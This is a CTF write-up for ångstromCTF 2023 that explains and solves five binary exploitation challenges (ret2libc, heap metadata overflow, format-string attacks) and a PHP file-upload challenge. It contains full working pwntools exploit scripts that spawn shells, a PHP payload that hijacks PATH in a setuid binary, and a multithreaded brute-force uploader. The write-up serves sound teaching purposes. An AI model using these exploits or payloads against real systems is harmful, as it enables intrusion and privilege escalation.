---
title: "ångstromCTF 2023"
date: "2023-04-22"
tags: ["CTF", "ångstrom", "jeopardy"]
---

# Pwn

## Gaga

This was a simple ret2libc challenge. There were two baby steps, which I skipped as the full flag was on the last one actually.
The main function is the following:

```c
void main(void)

{
  char buffer [60];
  __gid_t local_c;

  setbuf(stdout,NULL);
  local_c = getegid();
  setresgid(local_c,local_c,local_c);
  puts("Awesome! Now there\'s no system(), so what will you do?!");
  printf("Your input: ");
  gets(buffer);
  return;
}
```

As we can see, `gets` is used. Moreover, we can use `checksec` to check that no canary is present in the binary and that the binary has static addresses (no PIE). Putting this all together means that we need to overwrite the return address and execute a ROP chain to leak the libc base and call `system`, which is not present in the binary.

To do so, we can use a trick that is fairly simple and abused in this type of challenges: first leaking libc, then calling main again, and finally call `system("/bin/sh")`.

Leaking libc is easy: we can just read (in this case, use `printf`) from an entry in the GOT that has already been initialized. My preferred choice is usually `__libc_start_main`.

After that, we can return to main and execute another ropchain. This time, we will use the leak from libc to find the "/bin/sh\x00" string, as well as the pointer to the `system` function.

A thing that has to be noted is the following: some libcs require calls to be aligned at 0x10 bytes (i.e. `$rsp & ~0x10 == $rsp`). If this is not respected, functions will try to dereference stuff on the stack with the wrong offset and likely cause a SIGSEGV. To fix this, we can simply use a `ret` gadget to advance the stack by 0x8.

The overall solve is the following:

```py
#!/usr/bin/env python3

from pwn import *

HOST = "challs.actf.co"
PORT = 31302

exe = ELF("./gaga2_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]

gdbscript = """
"""


def conn(*a, **kw):
    if args.LOCAL:
        return process([exe.path], **kw)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript, **kw)
    else:
        return remote(HOST, PORT, **kw)


io = conn(level="debug")

# Add functions below here, if needed


def main():
    global io

    # good luck pwning :)
    pop_rdi = 0x00000000004012B3
    ret = 0x000000000040101A

    rop = ROP(exe)
    rop.raw(ret)  # ret (stack alignment)
    rop.raw(pop_rdi)  # pop rdi
    rop.raw(exe.got.__libc_start_main)
    rop.raw(exe.symbols.printf)
    rop.raw(ret)  # ret (stack alignment)
    rop.main()

    payload = b"A" * 64 + b"B" * 8 + rop.chain()
    io.sendlineafter(b"Your input: ", payload)
    libc.address = (
        u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
        - libc.symbols.__libc_start_main
    )
    log.success(f"libc @ {hex(libc.address)}")

    rop = ROP(exe)
    rop.raw(ret)  # ret (stack alignment)
    rop.raw(pop_rdi)  # pop rdi
    rop.raw(next(libc.search(b"/bin/sh\x00")))  # /bin/sh\x00 pointer
    rop.raw(libc.symbols.system)
    payload = b"A" * 64 + b"B" * 8 + rop.chain()
    io.sendlineafter(b"Your input: ", payload)

    io.interactive()


if __name__ == "__main__":
    main()

```

## Leek

This is a challenge that allows to learn a little bit about how GLIBC `malloc` is implemented and works.

### Exploration

The main of the challenge is roughly the following:

```c
void main(void) {
  __gid_t __rgid;
  int iVar1;
  time_t tVar2;
  char *guess_chunk;
  char *rand_chunk;
  long in_FS_OFFSET;
  int i;
  int j;
  char buffer [40];
  long canary;

  canary = *(long *)(in_FS_OFFSET + 0x28);
  tVar2 = time(NULL);
  srand((uint)tVar2);
  setbuf(stdout,NULL);
  setbuf(stdin,NULL);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("I dare you to leek my secret.");
  i = 0;
  while( true ) {
    if (99 < i) {
      puts("Looks like you made it through.");
      win();
      if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    guess_chunk = (char *)malloc(0x10);
    rand_chunk = (char *)malloc(0x20);
    memset(rand_chunk,0,0x20);
    getrandom(rand_chunk,0x20,0);
    for (j = 0; j < 0x20; j = j + 1) {
      if ((rand_chunk[j] == '\0') || (rand_chunk[j] == '\n')) {
        rand_chunk[j] = '\x01';
      }
    }
    printf("Your input (NO STACK BUFFER OVERFLOWS!!): ");
    input(guess_chunk);
    printf(":skull::skull::skull: bro really said: ");
    puts(guess_chunk);
    printf("So? What\'s my secret? ");
    fgets(buffer,0x21,stdin);
    iVar1 = strncmp(rand_chunk,buffer,0x20);
    if (iVar1 != 0) break;
    puts("Okay, I\'ll give you a reward for guessing it.");
    printf("Say what you want: ");
    gets(guess_chunk);
    puts("Hmm... I changed my mind.");
    free(rand_chunk);
    free(guess_chunk);
    puts("Next round!");
    i = i + 1;
  }
  puts("Wrong!");
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

From this, we can see that the `win` function is called after 100 iterations of the loop. In the loop, we first allocate two chunks (of size 0x10 and 0x20 respectively). The second one is written with random bytes (that are not 0x0 or 0xa). Then, we can write stuff into the first chunk with the `input` function, which is defined as:

```c
void input(void *chunk) {
  size_t __n;
  long in_FS_OFFSET;
  char buffer [1288];
  long canary;

  canary = *(long *)(in_FS_OFFSET + 0x28);
  fgets(buffer,0x500,stdin);
  __n = strlen(buffer);
  memcpy(chunk,buffer,__n);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

As we can see, this function allows overflowing over the end of the first chunk due to the lack of checks done before copying bytes to it (e.g. checking the length of the input against the size of the chunk).
After getting our input, it asks to guess the random bytes of the second chunk.
If we guess correctly, it calls `gets(first_chunk)`, allowing us to write as many bytes as we want to it and finally frees both chunks. If we guess incorrectly, the program exits.

New to heap? I recommend reading some online resources about how it works before continuing. There are good articles, such as the series from [azeria-labs](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/). Of course, also checking the [source code](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c) is a good option.

### Exploitation

The first thing we need to do is overflowing the second chunk. Due to the calls to `setvbuf`, we don't have to worry about functions allocating stuff on the heap. Therefore, we can expect the two chunks to be adjacent. In particular, we will have the first chunk right above the second one. This is how the heap looks from GDB:

```
0x174f290:	0x0000000000000000	0x0000000000000021 <-- first chunk header
0x174f2a0:	0x0000000000000000	0x0000000000000000 <-- first chunk data
0x174f2b0:	0x0000000000000000	0x0000000000000031 <-- second chunk header
0x174f2c0:	0xc8bd3bffa466d6c4	0x83f759c86a80ecc0 <-- second chunk data
0x174f2d0:	0x3e743ca04adf54f9	0x764841e3e9fb4889
0x174f2e0:	0x0000000000000000	0x0000000000020d21 <-- wilderness/top chunk
```

To pass the check on the second chunk content, we can simply overwrite the second chunk content to be all As. The heap will now look similar to this:

```
0x174f290:	0x0000000000000000	0x0000000000000021 <-- first chunk header
0x174f2a0:	0x6161616261616161	0x6161616461616163 <-- first chunk data
0x174f2b0:	0x6161616661616165	0x6161616861616167 <-- second chunk header
0x174f2c0:	0x4141414141414141	0x4141414141414141 <-- second chunk data
0x174f2d0:	0x4141414141414141	0x4141414141414141
0x174f2e0:	0x000000000000000a	0x0000000000020d21 <-- wilderness/top chunk
```

Note that we have overwritten also metadata of the two chunks, and that the program calls `free`. If `free` is called on such a chunk, it will either cause a SIGSEGV or fail a sanity/security check.

We now need to fix the metadata. What was there in the first place?
The first chunk header is untouched, as we read starting from its data.
What is completely changed is the second chunk header. Before the overwrite, it was:

```
0x174f2b0:	0x0000000000000000	0x0000000000000031
```

The first 8 bytes are the `prev_size`, which is a field that is zero when the previous chunk is allocated (and in some other cases depending on the type of chunk). The second 8 bytes are the size of the chunk, as well as some metadata. In particular, each chunk in GLIBC is aligned to 0x8 bytes, meaning that the lowest 3 bits of the size can be used for other purposes. In particular, the lowest bit is used to indicate whether the previous chunk is allocated or not.

Now that we have understood a little how the heap in GLIBC works, we can go on and fix the metadata so that free doesn't crash. How? Well, just write back the metadata that were there (if possible), that is, write some random padding to get to the second chunk metadata and first write zeros and then the size of the chunk with the `PREV_INUSE` bit set.

The final exploit that implements this attack is the following:

```py
#!/usr/bin/env python3

from pwn import *

HOST = "challs.actf.co"
PORT = 31310

exe = ELF("./leek_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]

gdbscript = """
b *0x004015e5
"""


def conn(*a, **kw):
    if args.LOCAL:
        return process([exe.path], **kw)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript, **kw)
    else:
        return remote(HOST, PORT, **kw)


io = conn(level="debug")


def main():
    global io

    # good luck pwning :)
    secret = b"A" * 0x20
    pwnit = flat({0x20: secret})
    fixup = flat({0x10: 0, 0x18: 0x31})

    for _ in range(100):
        io.sendlineafter(b"Your input", pwnit)
        io.sendafter(b"So? What's my secret? ", secret)
        io.sendlineafter(b"Say what you want: ", fixup)

    io.interactive()


if __name__ == "__main__":
    main()
```

## Widget

We are given an ELF binary. The main function looks like the following:

```c
void main(void) {
  int n;
  char buf [24];
  __gid_t local_10;
  uint i;

  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  local_10 = getegid();
  setresgid(local_10,local_10,local_10);
  if (called != 0) {
    exit(1);
  }
  called = 1;
  printf("Amount: ");
  n = 0;
  __isoc99_scanf("%d",&n);
  getchar();
  if (n < 0) {
    exit(1);
  }
  printf("Contents: ");
  read(0,buf,(long)n);
  i = 0;
  while(true) {
    if (n <= (int)i) {
      printf("Your input: ");
      printf(buf);
      return;
    }
    if (buf[(int)i] == 'n') break;
    i = i + 1;
  }
  printf("bad %d\n",(ulong)i);
  exit(1);
}
```

Remember the trick from the previous challenge where we leaked libc and returned to main? Well, seems to be impossible here due to the check of the `called` variable. However, we may not seem to even need to return to libc as we also have a `win` function:

```c
void win(char *param_1,char *param_2) {
  int iVar1;
  char local_98 [136];
  FILE *local_10;

  iVar1 = strncmp(param_1,"14571414c5d9fe9ed0698ef21065d8a6",0x20);
  if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = strncmp(param_2,"willy_wonka_widget_factory",0x1a);
  if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Error: missing flag.txt.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_98,0x80,local_10);
  puts(local_98);
  return;
}
```

We can see that, if called with the correct parameters, this function will actually print us the flag. Easy, right?

Well, only seemingly so. The problem here is that we are missing the usual gadgets from `__libc_csu_init`. A quick look with ropper reveals this:

```
(widget/ELF/x86_64)> search pop%
[INFO] Searching for gadgets: pop%

[INFO] File: widget
0x000000000040127d: pop rbp; ret;
```

We usually get at least a `pop rdi; ret;` and a `pop rsi; pop r15; ret;`, which come from boilerplate added by the compiler when compiling against GLIBC.
I don't really know how they did it, but this binary is compiled against GLIBC, but it does not contain the `__libc_csu_init` function.

Without these two gadgets, we cannot actually call the `win` function correctly... well, we actually can: who said that we have to call the `win` function from the start? We can actually just call the `win` function from the start of the `fopen` call and get the flag.

Notice that we also need to make sure that `rbp` contains a writeable address. In most cases, when possible, having `rbp` point to somewhere in the `bss` is the best choice. This is due to the fact that `rbp` is used to reference stack positions when, for example, saving the `FILE *` resulting from the `fopen` call. Note that, while we do have a `pop rbp; ret;` gadget, we simply need to set a valid `rbp` on the stack when overwriting the return address. The `leave` instruction will do the rest.

```py
#!/usr/bin/env python3

from pwn import *
from subprocess import check_output

HOST = "challs.actf.co"
PORT = 31320

exe = ELF("./widget_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]

gdbscript = """
b *0x004014c7
"""


def conn(*a, **kw):
    if args.LOCAL:
        return process([exe.path], **kw)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript, **kw)
    else:
        return remote(HOST, PORT, **kw)


io = conn(level="debug")


def main():
    global io

    # good luck pwning :)
    if not args.LOCAL and not args.GDB:
        io.recvuntil(b"sh -s ")
        io.sendlineafter(
            b"solution: ", check_output(["./pow", io.recvline(keepends=False).decode()])
        )

    rop = ROP(exe)
    rop.raw(0x40130B)

    payload = b"A" * (24 + 8) + p64(exe.bss(1000)) + rop.chain()
    io.sendlineafter(b"Amount: ", str(len(payload)).encode())
    io.sendlineafter(b"Contents: ", payload)
    io.interactive()


if __name__ == "__main__":
    main()

```

## Slack

Yet another format string vulnerability... but I swear this is kinda interesting to solve actually (and so will be the next one too)!

We are given a binary with the following main:

```c
void main(void) {
  __gid_t __rgid;
  int iVar1;
  time_t t2;
  long in_FS_OFFSET;
  int i;
  time_t t1;
  tm *lt;
  char time_buf [32];
  char buf [40];
  long canary;

  canary = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,NULL);
  setbuf(stdin,NULL);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("Welcome to slack (not to be confused with the popular chat service Slack)!");
  t1 = time(NULL);
  lt = localtime(&t1);
  t2 = time(NULL);
  srand((uint)t2);
  for (i = 0; i < 3; i = i + 1) {
    strftime(time_buf,0x1a,"%Y-%m-%d %H:%M:%S",lt);
    iVar1 = rand();
    printf("%s -- slack Bot:  %s\n",time_buf,messages[iVar1 % 8]);
    printf("Your message (to increase character limit, pay $99 to upgrade to Professional): ");
    fgets(buf,0xe,stdin);
    lt = localtime(&t1);
    strftime(time_buf,0x1a,"%Y-%m-%d %H:%M:%S",lt);
    printf("%s -- You: ",time_buf);
    printf(buf);
    putchar(10);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Among the other useless things, we have a format string vulnerability of size `0xd` (as `fgets` reads one less byte) that is repeat for three times total. This is a very restricted format string.

The first thing I did was getting a leak of libc and of the stack. One out of three format strings gone.

It took a while, but the best approach is for sure to first try to gain a less restricted format string. We can't increase the size of it, but we can change the number of times the loop is executed. To do so, we can overwrite the counter of the loop `i`. Notice that it is treated as a `int` (and compared using `jle`, which is a signed comparison), meaning that we can simply overwrite the highest bit to one to obtain a huge loop. Doing it is not as simple though.

First, to do it we need to have on the stack the address of the highest byte of the `i` variable. However, we cannot be the ones writing it due to lack of sufficient space. We need to find a way to have the address on stack without writing it... and the best way is to use what we have on the stack already. First, we want to find a pointer to a stack address on stack. This would allow us to overwrite the address it points to so that it then points to an address of our choice. From GDB, we can see that such an address exist:

![](/images/angstrom2023_slack_gdb_1.png)

We can now overwrite that address lowest byte so that it points to the loop variable highest byte. This requires some simple arithmetic. Second format string available to us also gone.

![](/images/angstrom2023_slack_gdb_2.png)

Finally, we can overwrite the loop counter highest byte with anything greater than 0x80 (highest bit set to one) to obtain a negative loop counter, leading to a huge loop! Third format string gone... but now we have basically unlimited format strings available to us.

Now we just need to repeat the same exact trick multiple times to write our ropchain and overwrite again the loop counter to a positive integer to trigger the return from main, and we are done! A little trick I used is using a onegadget: there is a onegadget here that has almost good constraints, which is why, instead of a ropchain that calls `system("/bin/sh")` I chose that. Doesn't make a great difference, but the exploit is a little faster when executing as it requires less writes.

The full script is the following. The hardcoded stack addresses are taken from GDB (with no ASLR) and are only used to compute the offset from the leaked stack address.

```py
#!/usr/bin/env python3

from pwn import *

HOST = "challs.actf.co"
PORT = 31500

exe = ELF("./slack_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]

gdbscript = """
b *printf+170
c
"""


def conn(*a, **kw):
    if args.LOCAL:
        return process([exe.path], **kw)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript, **kw)
    else:
        return remote(HOST, PORT, **kw)


def pwn(level):
    io = conn(level=level)
    io.sendafter(b"Professional):", f"%21$lx.%25$lx".encode())
    io.recvuntil(b"You: ")
    libc_leak, stack_leak = io.recvline(keepends=False).split(b".")
    libc.address = int(libc_leak, 16) - (libc.symbols.__libc_start_call_main + 128)
    log.success(f"libc @ {hex(libc.address)}")
    stack_leak = int(stack_leak, 16)
    log.success(f"stack leak @ {hex(stack_leak)}")

    retaddr = stack_leak - (0x7FFFFFFFD738 - 0x7FFFFFFFD628)
    ptr_ptr = stack_leak - (0x7FFFFFFFD738 - 0x7FFFFFFFD648)
    ptr_ptr_offset = 25
    ptr_offset = 0x4D - 0x6 - 16
    log.success(f"retaddr @ {hex(retaddr)}")
    log.success(f"ptr_ptr @ {hex(ptr_ptr)}")
    pop_rcx = libc.address + 0x000000000008C6BB  # pop rcx; ret;
    one_gadget = libc.address + 0x50A37

    io.sendafter(
        b"Professional):",
        f"%{(stack_leak & 0xffff) - 0x180 + 3}c%{ptr_ptr_offset}$hn".encode(),
    )

    io.sendlineafter(b"Professional):", f"%{0xf0}c%{ptr_offset}$hhn".encode())

    """
    0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
    constraints:
      rsp & 0xf == 0
      rcx == NULL
      rbp == NULL || (u16)[rbp] == NULL
    """

    # pop rcx
    for i in range(6):
        io.sendafter(
            b"Professional):",
            f"%{(retaddr & 0xffff) + i}c%{ptr_ptr_offset}$hn".encode(),
        )
        io.sendlineafter(
            b"Professional):",
            f"%{(pop_rcx >> (8 * i)) & 0xff}c%{ptr_offset}$hhn".encode(),
        )

    # one_gadget
    for i in range(6):
        io.sendafter(
            b"Professional):",
            f"%{(retaddr & 0xffff) + 8 * 2 + i}c%{ptr_ptr_offset}$hn".encode(),
        )
        io.sendlineafter(
            b"Professional):",
            f"%{(one_gadget >> (8 * i)) & 0xff}c%{ptr_offset}$hhn".encode(),
        )

    # rbp to zero
    io.sendafter(
        b"Professional):",
        f"%{(retaddr & 0xffff) - 8}c%{ptr_ptr_offset}$hn".encode(),
    )
    io.sendlineafter(
        b"Professional):",
        f"%{ptr_offset}$hhn".encode(),
    )

    # reset for index to trigger return
    io.sendafter(
        b"Professional):",
        f"%{(stack_leak & 0xffff) - 0x180 + 3}c%{ptr_ptr_offset}$hn".encode(),
    )

    io.sendlineafter(b"Professional):", f"%{ptr_offset}$hhn".encode())

    return io


def main():
    global io

    # good luck pwning :)
    io = pwn("debug")
    io.interactive()


if __name__ == "__main__":
    main()
```

## Noleek

The challenge provides us with the source code:

```c
#include <stdio.h>
#include <stdlib.h>

#define LEEK 32

void cleanup(int a, int b, int c) {}

int main(void) {
  setbuf(stdout, NULL);
  FILE *leeks = fopen("/dev/null", "w");
  if (leeks == NULL) {
    puts("wtf");
    return 1;
  }
  printf("leek? ");
  char inp[LEEK];
  fgets(inp, LEEK, stdin);
  fprintf(leeks, inp);
  printf("more leek? ");
  fgets(inp, LEEK, stdin);
  fprintf(leeks, inp);
  printf("noleek.\n");
  cleanup(0, 0, 0);
  return 0;
}
```

Basically, we have (yet another) format string... but this time it gets printed to `/dev/null` instead of stdout.
This means that we have definitely no way to leak anything, and we must create a leakless exploit. A teammate found the link to [a writeup](https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/) for another challenge which held the key to solving this one. This writeup (which I suggest reading as it explains stuff better than I ever could) introduces the `*` width modifier of printf.

The `*` modifier is used in printf to introduce a dynamic padding based on the value on the stack. The intended usage is to allow padding with a runtime chosen pad length. As it reads a variable from the stack, however, we can abuse it: what if the variable on the stack is a libc address? Without printing to `/dev/null`, this would most likely lead to a timeout on the challenge. In this challenge though we are printing to `/dev/null`, which is pretty fast. We have now achieved to leak ASLR!

Wait, didn't you say it wasn't possible? Well yes, it is not possible... however, by printing a libc address to `/dev/null` we set the printf printed chars counter to that value too! This means that a future `%n` specifier contains the "leak" and can overwrite correctly memory!

In practice, we didn't manage to use the specifier this way. Instead, we were only able to leak the lower part of the address, which is enough to still perform the attack anyway! The idea is the following: first find and overwrite a pointer to a stack pointer (as in the previous challenge `slack`) so that it points to the return address of main. Afterwards, we can use that pointer to overwrite the return address with a proper onegadget.

Of course, we don't actually want to write _exactly_ what we read with the `*` width modifier. Therefore, we still need to print some more characters in order to reach our target address using the `c` specifier.

The solve script has some hardcoded values that are taken directly from GDB. As the script isn't 100% reliable, probably due some particular unfavourable bit configurations, I recommand running the script yourself with the breakpoint that is already set.

```py
#!/usr/bin/env python3

from pwn import *

HOST = "challs.actf.co"
PORT = 31400

exe = ELF("./noleek_patched")
libc = ELF("./libc-2.31.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]

gdbscript = """
b *fprintf+145
c
"""


def conn(*a, **kw):
    if args.LOCAL:
        return process([exe.path], **kw)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript, **kw)
    else:
        return remote(HOST, PORT, **kw)


io = conn(level="debug")

# Add functions below here, if needed


def main():
    global io

    # good luck pwning :)

    """
    0xc9620 execve("/bin/sh", rsi, rdx)
    constraints:
      [rsi] == NULL || rsi == NULL
      [rdx] == NULL || rdx == NULL
    """
    payload = "%*1$.d"  # read a stack address as padding
    payload += "%56c"  # offset from the stack address to the return address stack address
    payload += "%13$n"  # offset for the pointer to a stack pointer
    io.sendlineafter(b"leek? ", payload.encode())

    payload = "%*12$.d"  # read a libc address as padding
    payload += "%678166c"  # offset from that libc address to the onegadget
    payload += "%42$n"  # offset of the pointer to return address
    io.sendlineafter(b"leek? ", payload.encode())

    io.interactive()


if __name__ == "__main__":
    main()
```

# Web

## Filestore

We are given the source code for a simple PHP application, as well as a Dockerfile and a couple of ELFs.

The PHP source is the following:

```php
<?php
    if($_SERVER['REQUEST_METHOD'] == "POST"){
        if ($_FILES["f"]["size"] > 1000) {
            echo "file too large";
            return;
        }

        $i = uniqid();

        if (empty($_FILES["f"])){
            return;
        }

        $where = "./uploads/" . $i . "_" . hash('sha256', $_FILES["f"]["name"]) . "_" . $_FILES["f"]["name"];
        print($where);
        if (move_uploaded_file($_FILES["f"]["tmp_name"], $where)){
            echo "upload success";
        } else {
            echo "upload error";
        }
    } else {
        if (isset($_GET["f"])) {
            include "./uploads/" . $_GET["f"];
        }

        highlight_file("index.php");

        // this doesn't work, so I'm commenting it out 😛
        // system("/list_uploads");
    }
?>
```

By looking at it, we can see that we can:

- include a file from the `upload` directory
- upload a file to the `upload` directory

However, the name of the file is not fully predictable: it is composed of a `uniqid()`, of its hash, and of the filename we passed. The last two are predictable, but the first one will need to some work. From the [PHP manual](https://www.php.net/manual/en/function.uniqid.php) and from running `uniqid()` locally, we can see that we can probably just bruteforce a little to succeed in including our file.

Before this, however, we need to find a way to get the flag. From the Dockerfile, we get to know that the flag is in `/flag.txt`. The issue is that the flag file is owned by the `admin` user and readable only by him (and its group), whereas the PHP app is running as the `ctf` user, meaning that we need to escalate privileges.

Remember that there are two binaries in the filesystem of the challenge?
Well, from the Dockerfile we can see that they have the SETUID bit set, and they are owned by `admin`, meaning that we may be able to use them to escalate our privileges.

### Finding a privilege escalation...

We proceeded by opening these two ELFs in Ghidra. They are both pretty simple. The `make_abyss_entry` binary is just used to create a temporary directory in the `/abyss` directory, which we cannot list. This is probably here to allow us to create files on the filesystem without leaking them to other CTF players.
Then, we analyzed the `list_uploads` binary too. The decompiled main looks like the following:

```c
void main(void) {
  __gid_t __rgid;

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  __rgid = getegid();
  setresgid(__rgid, __rgid, __rgid);
  system("ls /var/www/html/uploads");
  return;
}
```

Do you see the vulnerability in here? The issue is not that it is using `system` (well, that's part of it actually...). The problem here arises from the fact that it is using `system` and calling `ls` without specifying the full path or clearing the `PATH` env variable. Therefore, we can hijack its call to `ls` by defining a script named `ls` and setting `PATH=/dir/of/our/ls:$PATH`, leading to our `ls` script being executed with `admin` privileges.

### ... and exploiting it!

We know have all the pieces to exploit the vulnerability, right? Right?
Almost: notice line 39 on the Dockerfile:

```
RUN rm -f /bin/chmod /usr/bin/chmod /bin/chown /usr/bin/chown
```

We do not have the `chmod` command! As our goal is to create a script that is executed in place of `/bin/ls`, we need it to be executable! Hope's not lost though: `chmod` is not the only way to change file permissions. In fact, it is just an interface to the system call `chmod`! We just need to find another way to call it. The first approach was to use PHP. We can already execute a PHP script as it is included, might as well use to `chmod` our `ls`. Unfortunately, it does not appear to work. I couldn't find a reason why. Anyhow, we can also use PERL, which is installed on the challenge container: `perl -e 'chmod 0777, "/path/to/ls"'`.

Finally, we can put together a PHP script that will leak us the flag:

```php
<?php
$abyss = trim(shell_exec("/make_abyss_entry"));
$ls = "/abyss/" . $abyss . "/ls";
system("echo -e '#!/bin/sh\\\\ncat /flag.txt' > " . $ls);
system("perl -e 'chmod 0777, \\"$ls\\"'");
system("export PATH=/abyss/$abyss:\\$PATH && /list_uploads");
```

The first line creates a directory in `/abyss` to put our `ls` in. Then, we first create the `ls` file with a simple `cat /flag.txt` command in it, we `chmod` it using PERL, and finally we run the `/list_uploads` ELF with the PATH set to use our `ls`.

### Sending the exploit

Last issue: we have to send our exploit and have it executed. To do this, we need to somehow guess the `uniqid()` output. The first thing that we can notice is that the server includes the `Date` header. From MSN documentation: "The Date general HTTP header contains the date and time at which the message originated. "
From this, we get to know the second in which the `uniqid()` was (likely) called. This de-randomizes the first 8 nibbles of `uniqid()`. The last 5 nibbles are still random, but we can try to brute force them. They are quite a bit, but with a bit (double pun intended) of luck we manage to succeed.

The script used is the following:

```py
#!/usr/bin/env python
import concurrent
import concurrent.futures
import requests
import datetime

file_content = """
<?php
$abyss = trim(shell_exec("/make_abyss_entry"));
$ls = "/abyss/" . $abyss . "/ls";
system("echo -e '#!/bin/sh\\\\ncat /flag.txt' > " . $ls);
system("perl -e 'chmod 0777, \\"$ls\\"'");
system("export PATH=/abyss/$abyss:\\$PATH && /list_uploads");
"""
filename = "exploit.php"
file_hash = "ab1159fd69632fa2c058c7a5a4a25e17696dfb32442a67cdb8643aabdff6955e"

open(filename, "w").write(file_content)

base_url = "https://filestore.web.actf.co"

f = open(filename)
r = requests.post(base_url, files={"f": f})
print(r.text)

date = r.headers["Date"]
date = datetime.datetime.strptime(date, "%a, %d %b %Y %H:%M:%S %Z")
date = int(date.timestamp()) + 3600 * 2

guesses = ["%08x" % date + "%05x" % i for i in range(0, 0xFFFFF)]


def get_flag(guess):
    print(".")
    r = requests.get(base_url, params={"f": f"{guess}_{file_hash}_{filename}"})
    if "actf{" in r.text:
        print(r.text)
        exit(0)


with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
    executor.map(get_flag, guesses)
```

P.S. when solving the challenge, this script worked at the first execution. Now it doesn't seem to find the flag. We may have got lucky with a very low `uniqid()` value for the microseconds. There may also be a smarter solution as well, but an online bruteforce of $~10^6$ looks feasible enough to me 🙃.
